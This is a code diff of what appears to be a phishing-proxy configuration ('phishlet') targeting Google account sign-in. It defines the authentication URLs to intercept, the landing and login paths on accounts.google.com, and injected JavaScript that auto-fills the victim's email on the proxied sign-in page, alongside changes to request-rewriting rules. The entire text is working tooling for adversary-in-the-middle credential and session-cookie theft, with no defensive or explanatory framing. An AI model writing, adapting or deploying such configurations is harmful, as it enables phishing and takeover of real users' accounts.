@@ -43,23 +43,26 @@ auth_urls:
   - '/CheckCookie'
   - '/_/AccountSettingsUi/browserinfo'
 
+landing_path:
+  - '/signin/v2/identifier'
 login:
-  domain: 'accounts.google.com'
-  #path : '/ServiceLogin'
-  path: '/v3/signin/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin'
-
-force_post:
-  - path: '/_/signin/sl/challenge'
-    search: 
-      - {key: 'f.req', search: '.*'}
-      - {key: 'continue', search: '.*'}
-    force:
-      - {key: 'continue', value: ''}
-    type: 'post'
-js_inject:
-  - trigger_domains: ['accounts.google.com']
-    trigger_paths: ['.*?']
+    domain: 'accounts.google.com'
+    path: '/ServiceLogin'
+    #path: '/signin/v2/identifier'
+js_inject:  
+  - trigger_domains: ["accounts.google.com"]
+    trigger_paths: ["/signin/v2/identifier"]
+    trigger_params: ["email"]
     script: |
+      function lp(){
+        var email = document.querySelector("#Email");
+        if (email != null) {
+          email.value = "{email}";
+          return;
+        }
+        setTimeout(function(){lp();}, 100);
+      }
+      setTimeout(function(){lp();}, 100);
       function serialize( obj ){
         var str = [];
         for (var p in obj){
